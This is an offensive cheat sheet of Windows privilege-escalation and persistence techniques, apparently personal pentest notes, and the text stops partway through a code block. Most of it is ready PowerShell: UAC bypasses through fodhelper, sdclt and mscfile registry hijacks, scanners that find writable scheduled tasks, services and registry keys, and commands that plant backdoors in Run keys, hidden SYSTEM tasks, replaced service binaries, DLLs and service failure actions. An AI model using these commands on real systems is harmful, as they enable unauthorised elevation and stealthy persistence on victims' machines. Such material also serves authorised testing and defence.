# User Account Control (UAC) Bypass

#### Checking UAC Status
- Determine if UAC is enabled:
	```powershell
	Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System
	```
- Another method to check UAC status:
	```powershell
	reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
	```
- Look for:
	- `EnableLUA`: UAC enabled (1) or disabled (0).
	- `ConsentPromptBehaviorAdmin`: Defines behavior for elevation prompts.

#### Running Processes with Elevated Privileges
- Launch a new PowerShell window with elevated privileges (triggers UAC prompt):
```powershell
Start-Process powershell -Verb runAs
```

#### Bypass UAC via Event Viewer (if Administrator but not elevated)
This method relies on the fact that Event Viewer runs with high integrity when invoked by an administrator. It can be used to bypass UAC.

1. Launch Event Viewer with administrative privileges:
   ```powershell
   Start-Process eventvwr.msc
   ```

2. Once Event Viewer is open, use it to execute arbitrary code with elevated privileges by launching a command prompt or PowerShell instance.

#### Bypass UAC via `FodHelper.exe`
- UAC bypass can often be achieved by exploiting auto-elevating binaries. Some binaries, such as `fodhelper.exe`, allow you to execute commands with elevated privileges without triggering a UAC prompt.
1. Create a registry entry to hijack the execution flow of `fodhelper.exe`:
	```powershell
	$command = "powershell.exe -Command Start-Process powershell -Verb runAs"
	Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "" -Value $command
	Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value ""
	````
2. Execute `fodhelper.exe` to trigger the bypass:
	```powershell
	Start-Process fodhelper
	```

#### Bypass UAC via `sdclt.exe` (Another Auto-Elevating Binary)
Like `fodhelper.exe`, `sdclt.exe` is another auto-elevating binary that can be exploited to bypass UAC.

1. Set registry entries to hijack `sdclt.exe`:
   ```powershell
   $command = "powershell.exe -Command Start-Process powershell -Verb runAs"
   Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(Default)" -Value $command
   Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Value ""
   ```
2. Run `sdclt.exe` to open a high-integrity PowerShell session:
   ```powershell
   Start-Process sdclt
   ```
3. A new elevated PowerShell session will now be available without a UAC prompt.

# Scheduled Tasks

#### Scheduled Task Enumeration

- List All Scheduled Tasks:
	```powershell
	Get-ScheduledTask
	```
- List All Scheduled Tasks with Task Owners and Commands:
	```powershell
	schtasks /query /fo LIST /v
	```
- Display Detailed Information for a Specific Scheduled Task:
	```powershell
	Get-ScheduledTaskInfo -TaskName "<task_name>"
	```
- Identify Scheduled Tasks Not Running as SYSTEM:
	```powershell
	Get-ScheduledTask | Where-Object { $_.Principal.UserId -ne "SYSTEM" } | Out-File "C:\Path\To\Outfile.txt"
	```
- List Tasks Running as SYSTEM:
	```powershell
	Get-ScheduledTask | Where-Object { $_.Principal.UserId -eq "SYSTEM" } | Out-File "C:\Path\To\Outfile.txt"
	```

#### Identify Writable Scheduled Task Configuration Paths
```powershell
# Set up output file paths
$Step1_OutputFilePath = "C:\Step1_Scheduled_Tasks_Configuration_ACL.txt"
$Step2_OutputFilePath = "C:\Step2_Scheduled_Tasks_Configuration_ACL_Filtered.txt"

# Set a large width to prevent line wrapping
$PSDefaultParameterValues['Out-File:Width'] = 300

# Initialize Step 1 output file (ACL data collection)
New-Item -Path $Step1_OutputFilePath -ItemType File -Force | Out-Null
New-Item -Path $Step2_OutputFilePath -ItemType File -Force | Out-Null

# Regex patterns for matching ACL entries
$patterns = @(
    "Everyone .*Allow.*  .*FullControl.*",
    "Everyone .*Allow.*  .*Modify.*",
    "Everyone .*Allow.*  .*Write.*",
    "Everyone .*Allow.*  .*Delete.*",
    "Everyone .*Allow.*  .*TakeOwnership.*",
    "Everyone .*Allow.*  .*ChangePermissions.*",
    "BUILTIN\\Users .*Allow.*  .*FullControl.*",
    "BUILTIN\\Users .*Allow.*  .*Modify.*",
    "BUILTIN\\Users .*Allow.*  .*Write.*",
    "BUILTIN\\Users .*Allow.*  .*Delete.*",
    "BUILTIN\\Users .*Allow.*  .*TakeOwnership.*",
    "BUILTIN\\Users .*Allow.*  .*ChangePermissions.*",
    "$env:userdomain\\$env:username .*Allow.*  .*FullControl.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Modify.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Write.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Delete.*",
    "$env:userdomain\\$env:username .*Allow.*  .*TakeOwnership.*",
    "$env:userdomain\\$env:username .*Allow.*  .*ChangePermissions.*"
)

# Query scheduled tasks and extract task names
$schtasksOutput = schtasks /query /fo LIST /v

# Use a regex to extract the "Task Name" field
$taskNames = $schtasksOutput | ForEach-Object {
    if ($_ -match "^TaskName:\s+(.+)$") {
        # Extract the task name
        $matches[1]
    }
} | Where-Object { $_ -ne $null } # Filter out invalid task names

# Initialize variables to hold the current task details
$currentTask = ""
$currentACL = @()

# Iterate over each task name and retrieve its ACL using Get-Acl
foreach ($taskName in $taskNames) {
    try {
        # Get the ACL information for the task folder (use task name as the folder path in the Scheduled Tasks folder)
        $acl = Get-Acl -Path "C:\Windows\System32\Tasks$taskName" | Format-List | Out-String -Width 300

        # Write the task name and ACL details to the Step 1 output file
        "TaskName: $taskName" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
        $acl | Out-String | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
        "`n" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8 # Add a newline for readability

        # Add ACL entries for matching
        $aclEntries = $acl -split "`n"
        $currentACL = $aclEntries | Where-Object { $_ -match ".*Allow.*" }

        # Check for matches in the ACL entries
        $matchingEntries = $currentACL | Where-Object { $_ -match ($patterns -join "|") }

        # If any matching ACL entry is found, write the task and matching ACLs to the Step 2 output file
        if ($matchingEntries.Count -gt 0) {
            "TaskName: $taskName" | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8
            $matchingEntries | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8
            "`n" | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8 # Add a newline for readability
        }
    }
    catch {
        # If an error occurs (e.g., if the task folder doesn't exist), log it to the output file
        "Failed to retrieve ACL for task: $taskName" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
        "`n" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
    }
}
```

#### Identify Writable Scheduled Task Executable Paths
```powershell
# Set up output file paths
$Step1_OutputFilePath = "C:\Step1_Scheduled_Tasks_Executable_ACL.txt"
$Step2_OutputFilePath = "C:\Step2_Scheduled_Tasks_Executable_ACL_Filtered.txt"

# Set a large width to prevent line wrapping
$PSDefaultParameterValues['Out-File:Width'] = 300

# Initialize Step 1 output file (ACL data collection)
New-Item -Path $Step1_OutputFilePath -ItemType File -Force | Out-Null
New-Item -Path $Step2_OutputFilePath -ItemType File -Force | Out-Null

# Regex patterns for matching ACL entries
$patterns = @(
    "Everyone .*Allow.*  .*FullControl.*",
    "Everyone .*Allow.*  .*Modify.*",
    "Everyone .*Allow.*  .*Write.*",
    "Everyone .*Allow.*  .*Delete.*",
    "Everyone .*Allow.*  .*TakeOwnership.*",
    "Everyone .*Allow.*  .*ChangePermissions.*",
    "BUILTIN\\Users .*Allow.*  .*FullControl.*",
    "BUILTIN\\Users .*Allow.*  .*Modify.*",
    "BUILTIN\\Users .*Allow.*  .*Write.*",
    "BUILTIN\\Users .*Allow.*  .*Delete.*",
    "BUILTIN\\Users .*Allow.*  .*TakeOwnership.*",
    "BUILTIN\\Users .*Allow.*  .*ChangePermissions.*",
    "$env:userdomain\\$env:username .*Allow.*  .*FullControl.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Modify.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Write.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Delete.*",
    "$env:userdomain\\$env:username .*Allow.*  .*TakeOwnership.*",
    "$env:userdomain\\$env:username .*Allow.*  .*ChangePermissions.*"
)

# Query scheduled tasks and extract executables
$schtasksOutput = schtasks /query /fo LIST /v

# Use a regex to extract the "Task To Run" field which contains the path to the executable
$taskExecutables = $schtasksOutput | ForEach-Object {
    if ($_ -match "^Task To Run:\s+(.+)$") {
        # Extract the executable path
        $matches[1]
    }
} | Where-Object { $_ -and (Test-Path $_) } # Filter out invalid paths

# Initialize variables to hold the current task details
$currentTask = ""
$currentACL = @()

# Iterate over each task executable and retrieve its ACL using Get-Acl
foreach ($executable in $taskExecutables) {
    try {
        # Get the ACL information for the task executable
        $acl = Get-Acl -Path $executable | Format-List | Out-String -Width 300

        # Write the executable path and ACL details to the Step 1 output file
        "Executable: $executable" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
        $acl | Out-String | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
        "`n" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8 # Add a newline for readability

        # Add ACL entries for matching
        $aclEntries = $acl -split "`n"
        $currentACL = $aclEntries | Where-Object { $_ -match ".*Allow.*" }
        
        # Check for matches in the ACL entries
        $matchingEntries = $currentACL | Where-Object { $_ -match ($patterns -join "|") }

        # If any matching ACL entry is found, write the task and matching ACLs to the Step 2 output file
        if ($matchingEntries.Count -gt 0) {
            "Executable: $executable" | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8
            $matchingEntries | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8
            "`n" | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8 # Add a newline for readability
        }
    }
    catch {
        # If an error occurs (e.g., if the executable path doesn't exist), log it to the output file
        "Failed to retrieve ACL for executable: $executable" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
        "`n" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
    }
}
```

#### Modifying an Existing Scheduled Task

- Modify a Scheduled Task: You can modify an existing scheduled task's action, trigger, or other properties. In this case, the task action is modified to run a hidden PowerShell script.
	```powershell
	Set-ScheduledTask -TaskName "MyPersistentTask" -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -Command C:\Temp\backdoor.ps1")
	```

#### Delete a Scheduled Task

- Unregister a Scheduled Task: Remove the task from the system.
    ```powershell
    Unregister-ScheduledTask -TaskName "MyPersistentTask" -Confirm:$false
    ```

#### Exploiting Writable Scheduled Tasks

1. Identify Writable Scheduled Tasks:  
   Finds scheduled tasks where non-administrative users, like "Everyone", have writable permissions, making them vulnerable.
	```powershell
	Get-ScheduledTask | ForEach-Object { 
		$task = $_.TaskName
		Get-Acl -Path "C:\Windows\System32\Tasks\$task" | Where-Object { $_.AccessToString -like "*Everyone Allow FullControl*" } 
	} | Out-File "C:\Path\To\Outfile.txt"
	```

2. Exploit Writable Scheduled Task:  
   If a scheduled task has writable permissions, you can alter it to run an elevated PowerShell session.
	```powershell
	schtasks /Change /TN "<TaskName>" /TR "powershell -Command \"Start-Process PowerShell -Verb RunAs\""
	```

3. Change User Running a Task (Requires Admin Privileges):  
   This command changes the user running the task to a new user with provided credentials.
	```powershell
	schtasks /change /tn "<task_name>" /ru "<new_user>" /rp "<new_password>"
	```

#### Examples of Creating Scheduled Tasks for Privilege Escalation

1. Create a Task Triggered by User Logon (User Level):  
   This creates a task that runs when a user logs in, useful for persistence.
	```powershell
	$action = New-ScheduledTaskAction -Execute "C:\path\to\program.exe"
	$trigger = New-ScheduledTaskTrigger -AtLogon
	Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "<task_name>" -Description "Persistence task"
	```

2. Create a Task Triggered by System Startup (System Level):  
   This task runs at system startup, regardless of whether a user logs in.
	```powershell
	$action = New-ScheduledTaskAction -Execute "C:\path\to\program.exe"
	$trigger = New-ScheduledTaskTrigger -AtStartup
	Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "<task_name>" -Description "System startup task"
	```

3. Create a Task Triggered by User Idle:  
   This creates a task that runs when the system becomes idle, another opportunity for persistence.
	```powershell
	$action = New-ScheduledTaskAction -Execute "C:\path\to\program.exe"
	$trigger = New-ScheduledTaskTrigger -AtIdle
	Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "<task_name>" -Description "Idle trigger task"
	```

4. Scheduled Task Triggered by Event Log:  
   This creates a task triggered by a specific event log, such as a security event, useful for stealthy persistence.
	```powershell
	$action = New-ScheduledTaskAction -Execute "C:\path\to\program.exe"
	$trigger = New-ScheduledTaskTrigger -AtLogon
	Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "<task_name>" -Description "Event log-based persistence"
	```

5. Create a Hidden Task (System Level):  
   This creates a hidden task that runs with SYSTEM privileges. The `-Hidden` setting helps evade detection by administrators.
	```powershell
	$action = New-ScheduledTaskAction -Execute "C:\path\to\program.exe"
	$trigger = New-ScheduledTaskTrigger -AtLogon
	$settings = New-ScheduledTaskSettingsSet -Hidden
	Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "<task_name>" -Settings $settings -User "SYSTEM"
	```

#### Scheduled Tasks Payload Examples
- [[Windows Targeting - Scheduled Tasks]]

# Windows Registry

- User-Level Persistence: Entries made under `HKCU` will affect only the current user.
- System-Level: Entries made under `HKLM` will affect the entire system, providing deeper persistence.

#### Manually Browse Registry Keys
```powershell
regedit
```

#### Get-ACL for Registry Hive Recursively
- Script queries target entire Windows Registry Hive for all ACLs:
```powershell
# Initialize output file path
$OutputFilePath = "C:\Path\To\Outfile.txt"

# Set a large width to prevent line wrapping
$PSDefaultParameterValues['Out-File:Width'] = 300

# Ensure the output file is created/reset with UTF-8 encoding
New-Item -Path $outputFilePath -ItemType File -Force | Out-Null

# Initialize path
$path = "Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\"

# Recursively query registry hive for ACLs and save to the output file
Get-ChildItem -Path $path -Recurse -ErrorAction SilentlyContinue | 
ForEach-Object { 
    Get-Acl -Path $_.PSPath 
} | Format-List | Out-String -Width 300 | Out-File -FilePath $OutputFilePath -Encoding UTF8
```

#### Get-ACL for Specific Registry Key
- Script queries target specified Windows Registry Key for Access Control List (ACL):
```powershell
# Initialize output file path
$OutputFilePath = "C:\Path\To\Outfile.txt"

# Set a large width to prevent line wrapping
$PSDefaultParameterValues['Out-File:Width'] = 300

# Ensure the output file is created/reset with UTF-8 encoding
New-Item -Path $outputFilePath -ItemType File -Force | Out-Null

# Initialize path
$path = "Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\"

# Retrieve the Access Control List (ACL) for the HKEY_CURRENT_USER registry hive
$RegistryACL = Get-Acl -Path $path

# Convert the ACL to a formatted string for easier reading
$AclFormattedString = $RegistryACL | Format-List | Out-String -Width 300

# Write the formatted ACL to the output file in UTF8 encoding
$AclFormattedString | Out-File -FilePath $OutputFilePath -Encoding UTF8
```

#### List Registry Keys with Weak Permissions
- Script queries target specified Windows Registry Hive for Access Control List (ACL) and parses out keys with weak permissions:
```powershell
# Initialize output file path
$OutputFilePath = "C:\Path\To\Outfile.txt"

# Set a large width to prevent line wrapping
$PSDefaultParameterValues['Out-File:Width'] = 300

# Ensure the output file is created/reset with UTF-8 encoding
New-Item -Path $outputFilePath -ItemType File -Force | Out-Null

# Initialize path
$path = "Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\"

# Initialize search patterns array
$SearchPatterns = @(
    "Everyone .*Allow.*  .*FullControl.*",
    "Everyone .*Allow.*  .*SetValue.*",
    "BUILTIN\\Users .*Allow.*  .*FullControl.*",
    "BUILTIN\\Users .*Allow.*  .*SetValue.*",
    "$env:userdomain\\$env:username .*Allow.*  .*FullControl.*",
    "$env:userdomain\\$env:username .*Allow.*  .*SetValue.*"
)

# Initialize an empty array to store matching registry paths
$MatchingRegistryPaths = @()

# Iterate over registry items and retrieve ACLs from the specified registry path
$RegistryItems = Get-ChildItem -Path $path -Recurse -ErrorAction SilentlyContinue

foreach ($RegistryItem in $RegistryItems) {
    try {
        # Retrieve the ACL for the current registry item
        $RegistryACL = Get-Acl -Path $RegistryItem.PSPath

        # Convert the ACL to a string format for pattern matching
        $AclContentString = $RegistryACL | Format-List | Out-String -Width 300

        # Check if the ACL content matches any of the search patterns
        foreach ($Pattern in $SearchPatterns) {
            if ($AclContentString -match $Pattern) {
                # Add the matching registry path to the array
                $MatchingRegistryPaths += $RegistryItem.PSPath
                break  # Stop checking other patterns if a match is found
            }
        }
    } catch {
        # Log error messages for any issues encountered during ACL retrieval
        $ErrorMessage = $_.Exception.Message
        Write-Output "Error processing $($RegistryItem.PSPath): $ErrorMessage"
    }
}

# Write the matching registry paths to the output file
$MatchingRegistryPaths | Out-File -FilePath $OutputFilePath
```

#### Exploit Write Access for Persistence
If the user has `WRITE` or `FULL CONTROL` on specific registry keys, modify them to include malicious payloads that will be executed on startup:
```powershell
Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'MaliciousApp' -Value 'C:\path\to\payload.exe'
```

#### Modify Registry for Privilege Escalation
Create or modify registry entries to escalate privileges (e.g., abusing `mscfile` handlers):
```powershell
New-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass" -PropertyType String -Force
```

#### Remove a Registry Entry
To remove a malicious persistence key:
```powershell
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name "MyBackdoor"
```

#### View Startup Program Registry Entries
View all entries in the `Run` key, commonly used for persistence:
```powershell
Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
```

#### Add a Registry Entry for Startup Persistence
You can add entries in the `Run` key for persistence:
```powershell
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name "MyBackdoor" -Value "C:\Backdoor\backdoor.exe"
```

#### Registry Key Payload Examples
- [[Windows Targeting - Registry Values]]

# Service

If a service’s executable file is writable, you can replace it with a malicious file to gain SYSTEM privileges on the next service start.

#### Listing Services and Their Executables
- List all service executables (including service paths):
	```powershell
	Get-WmiObject -Class Win32_Service | Select-Object Name, StartMode, State, PathName
	```
- List all automatically starting services that are running:
	```powershell
	Get-Service | Where-Object { $_.StartType -eq 'Automatic' -and $_.Status -eq 'Running' }
	```

#### Checking for Unquoted Paths
Unquoted service paths are a common issue that allows path traversal attacks. If the path contains spaces and is not enclosed in quotes, an attacker can place a malicious executable in a higher directory to gain execution under `SYSTEM`.
- Identify services with unquoted service paths, which could be exploited for privilege escalation:
	```powershell
	Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -like '* ' -and $_.PathName -notlike '"*' }
	```

#### Identify Writable Service Configuration Paths
```powershell
# Set up output file paths
$Step1_OutputFilePath = "C:\Step1_Service_Config_ACL.txt"
$Step2_OutputFilePath = "C:\Step2_Service_Config_ACL_Filtered.txt"

# Set a large width to prevent line wrapping
$PSDefaultParameterValues['Out-File:Width'] = 300

# Initialize Step 1 and Step 2 output files (ACL data collection)
New-Item -Path $Step1_OutputFilePath -ItemType File -Force | Out-Null
New-Item -Path $Step2_OutputFilePath -ItemType File -Force | Out-Null

# Regex patterns for matching ACL entries
$patterns = @(
    "Everyone .*Allow.*  .*FullControl.*",
    "Everyone .*Allow.*  .*Modify.*",
    "Everyone .*Allow.*  .*Write.*",
    "Everyone .*Allow.*  .*Delete.*",
    "Everyone .*Allow.*  .*TakeOwnership.*",
    "Everyone .*Allow.*  .*ChangePermissions.*",
    "BUILTIN\\Users .*Allow.*  .*FullControl.*",
    "BUILTIN\\Users .*Allow.*  .*Modify.*",
    "BUILTIN\\Users .*Allow.*  .*Write.*",
    "BUILTIN\\Users .*Allow.*  .*Delete.*",
    "BUILTIN\\Users .*Allow.*  .*TakeOwnership.*",
    "BUILTIN\\Users .*Allow.*  .*ChangePermissions.*",
    "$env:userdomain\\$env:username .*Allow.*  .*FullControl.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Modify.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Write.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Delete.*",
    "$env:userdomain\\$env:username .*Allow.*  .*TakeOwnership.*",
    "$env:userdomain\\$env:username .*Allow.*  .*ChangePermissions.*"
)

# Query services and extract service configuration paths from the registry
$services = Get-WmiObject -Class Win32_Service

# Initialize variables to hold the current service details
$currentService = ""
$currentACL = @()

# Iterate over each service and query the registry for configuration paths
foreach ($service in $services) {
    $serviceName = $service.Name
    $registryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName\Parameters"

    try {
        # Attempt to retrieve registry keys that may point to config file paths (e.g., ImagePath, ConfigPath)
        $serviceParams = Get-ItemProperty -Path $registryPath -ErrorAction SilentlyContinue
        
        # Check if there are any paths like ConfigFile, DataFile, or other registry properties
        $configPaths = @()
        foreach ($property in $serviceParams.PSObject.Properties) {
            if ($property.Value -and (Test-Path $property.Value)) {
                $configPaths += $property.Value
            }
        }

        # Process each configuration path
        foreach ($configPath in $configPaths) {
            $cleanConfigPath = $configPath -replace '"', '' # Remove any surrounding quotes from the path
            try {
                # Get the ACL information for the configuration file
                $acl = Get-Acl -Path $cleanConfigPath | Format-List | Out-String -Width 300

                # Write the config file path and ACL details to the Step 1 output file
                "Configuration Path: $cleanConfigPath" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
                $acl | Out-String | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
                "`n" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8 # Add a newline for readability

                # Add ACL entries for matching
                $aclEntries = $acl -split "`n"
                $currentACL = $aclEntries | Where-Object { $_ -match ".*Allow.*" }

                # Check for matches in the ACL entries
                $matchingEntries = $currentACL | Where-Object { $_ -match ($patterns -join "|") }

                # If any matching ACL entry is found, write the service and matching ACLs to the Step 2 output file
                if ($matchingEntries.Count -gt 0) {
                    "Configuration Path: $cleanConfigPath" | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8
                    $matchingEntries | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8
                    "`n" | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8 # Add a newline for readability
                }
            }
            catch {
                # If an error occurs (e.g., if the config file path doesn't exist), log it to the output file
                "Failed to retrieve ACL for configuration path: $cleanConfigPath" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
                "`n" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
            }
        }
    }
    catch {
        # If an error occurs while retrieving the registry keys, log it
        "Failed to retrieve registry details for service: $serviceName" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
        "`n" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
    }
}
```

#### Identify Writable Service Executable Paths
```powershell
# Set up output file paths
$Step1_OutputFilePath = "C:\Step1_Service_Executable_ACL.txt"
$Step2_OutputFilePath = "C:\Step2_Service_Executable_ACL_Filtered.txt"

# Set a large width to prevent line wrapping
$PSDefaultParameterValues['Out-File:Width'] = 300

# Initialize Step 1 and Step 2 output files (ACL data collection)
New-Item -Path $Step1_OutputFilePath -ItemType File -Force | Out-Null
New-Item -Path $Step2_OutputFilePath -ItemType File -Force | Out-Null

# Regex patterns for matching ACL entries
$patterns = @(
    "Everyone .*Allow.*  .*FullControl.*",
    "Everyone .*Allow.*  .*Modify.*",
    "Everyone .*Allow.*  .*Write.*",
    "Everyone .*Allow.*  .*Delete.*",
    "Everyone .*Allow.*  .*TakeOwnership.*",
    "Everyone .*Allow.*  .*ChangePermissions.*",
    "BUILTIN\\Users .*Allow.*  .*FullControl.*",
    "BUILTIN\\Users .*Allow.*  .*Modify.*",
    "BUILTIN\\Users .*Allow.*  .*Write.*",
    "BUILTIN\\Users .*Allow.*  .*Delete.*",
    "BUILTIN\\Users .*Allow.*  .*TakeOwnership.*",
    "BUILTIN\\Users .*Allow.*  .*ChangePermissions.*",
    "$env:userdomain\\$env:username .*Allow.*  .*FullControl.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Modify.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Write.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Delete.*",
    "$env:userdomain\\$env:username .*Allow.*  .*TakeOwnership.*",
    "$env:userdomain\\$env:username .*Allow.*  .*ChangePermissions.*"
)

# Query services and extract service executables
$services = Get-WmiObject -Class Win32_Service

# Extract the "PathName" property which contains the path to the service executable
$serviceExecutables = $services | ForEach-Object {
    $_.PathName -replace '"', ''  # Remove quotes from the executable path if present
} | Where-Object { $_ -and (Test-Path $_) } # Filter out invalid paths

# Initialize variables to hold the current service details
$currentService = ""
$currentACL = @()

# Iterate over each service executable and retrieve its ACL using Get-Acl
foreach ($executable in $serviceExecutables) {
    try {
        # Get the ACL information for the service executable
        $acl = Get-Acl -Path $executable | Format-List | Out-String -Width 300

        # Write the executable path and ACL details to the Step 1 output file
        "Executable: $executable" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
        $acl | Out-String | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
        "`n" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8 # Add a newline for readability

        # Add ACL entries for matching
        $aclEntries = $acl -split "`n"
        $currentACL = $aclEntries | Where-Object { $_ -match ".*Allow.*" }
        
        # Check for matches in the ACL entries
        $matchingEntries = $currentACL | Where-Object { $_ -match ($patterns -join "|") }

        # If any matching ACL entry is found, write the service and matching ACLs to the Step 2 output file
        if ($matchingEntries.Count -gt 0) {
            "Executable: $executable" | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8
            $matchingEntries | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8
            "`n" | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8 # Add a newline for readability
        }
    }
    catch {
        # If an error occurs (e.g., if the executable path doesn't exist), log it to the output file
        "Failed to retrieve ACL for executable: $executable" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
        "`n" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
    }
}
```

#### Service Executable Replacement
If you have `WRITE` or `FULL CONTROL` access over a service’s executable, you can replace it with a malicious binary to escalate privileges.
1. Grant full control over a vulnerable service's binary to the current user (requires administrative privileges):
	```powershell
	Get-Acl -Path '<executable_path>' | Format-List
	```
2. Grant full control over the service executable to the current user (if needed):
	```powershell
	icacls <path_to_service_executable> /grant <username>:F
	```
3. Replace the binary or modify its ACL:
	```powershell
	cp C:\Path\To\Malicious.exe C:\Vulnerable\Path\service.exe
	```
4. Restart the service to trigger privilege escalation:
	```powershell
	Restart-Service <service_name>
	```

#### Service Configuration Hijacking
If the user has `WRITE` or `FULL CONTROL` on the service’s configuration, it can be modified to point to a malicious executable:
1. `Set-Service`: Modify an existing service.
	```powershell
	Set-Service -Name "<malicious_service_name>" -BinaryPathName "C:\Path\To\Malicious.exe" -Description "Malicious Service" -StartupType Automatic
	```

	```powershell
	Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\<service_name>" -Name "ImagePath" -Value "C:\Path\To\Malicious.exe"
	```
2. Restart the service to execute the malicious binary:
    ```powershell
    Restart-Service <service_name>
    ```

#### Exploiting DLL Hijacking via Services
Some services load specific DLLs at startup. If the service has improper permissions on the directory or file, and the current user can modify them, DLL hijacking can be used to escalate privileges.
1. Identify vulnerable services that load DLLs:
	```powershell
	Get-WmiObject -Class Win32_Service | Select-Object Name, StartMode, State, PathName | Where-Object { $_.PathName -like '*.dll' }
	```
2. Replace a vulnerable DLL with a malicious DLL:
	```powershell
	cp C:\Path\To\Malicious.dll C:\Path\To\Vulnerable\DLL.dll
	```
3. Restart the service to load the malicious DLL:
	```powershell
	Restart-Service <service_name>
	```
The malicious DLL will be loaded with SYSTEM privileges, allowing privilege escalation.

#### Create a New Service
If you have sufficient privileges to create services, you can create a new service to run a malicious executable with elevated privileges.
- Create a malicious service:
    ```powershell
    New-Service -Name "<malicious_service_name>" -BinaryPathName "C:\Path\To\Malicious.exe" -Description "Malicious Service" -StartupType Automatic 
    ```
2. Start the service to execute the malicious binary:
    ```powershell
    Start-Service <service_name>
    ```

#### Service Failure Recovery Exploitation
Services often have failure recovery options that can be exploited. If a service is configured to restart or run a program when it fails, you can set the recovery action to execute a malicious script. 
- Set the recovery action to run a malicious command:
    ```powershell
    sc.exe failure <service_name> reset= 0 actions= run/6000/""/C:\Backdoor\backdoor.exe
    ```

#### Delete a Service
- `Remove-Service`: Remove a service to clean up.
	```powershell
	Stop-Service -Name "<malicious_service_name>"
	Remove-Service -Name "<malicious_service_name>"
	```

#### Examples
- Custom Service Creation with DLL: Create a service that runs a DLL payload.
    ```powershell
    New-Service -Name "<service_name>" -Binary "rundll32.exe" -ArgumentList "C:\path\to\payload.dll, EntryPointFunction" -DisplayName "<service_display_name>" -StartupType Automatic
    ```
- Change the Binary Path of a Service: Modify an existing service to point to a different binary.
    ```powershell
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\<service_name>" -Name "ImagePath" -Value "C:\path\to\new_binary.exe"
    ```
- Hijack a Vulnerable Service with Write Permissions: Identify services where the executable path or config files are writable, then overwrite or modify them to achieve persistence.
    ```powershell
    Get-WmiObject -Class Win32_Service | Where-Object { (Get-Acl -Path $_.PathName).AccessToString -match "Write" }
    ```
- Modifies autorun services to include a malicious command:
	```powershell
	Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "PersistentService" -Value "powershell.exe -NoProfile -WindowStyle Hidden -Command <command_or_script_path>"
	```
- Creates a Winlogon script for persistence:
	```powershell
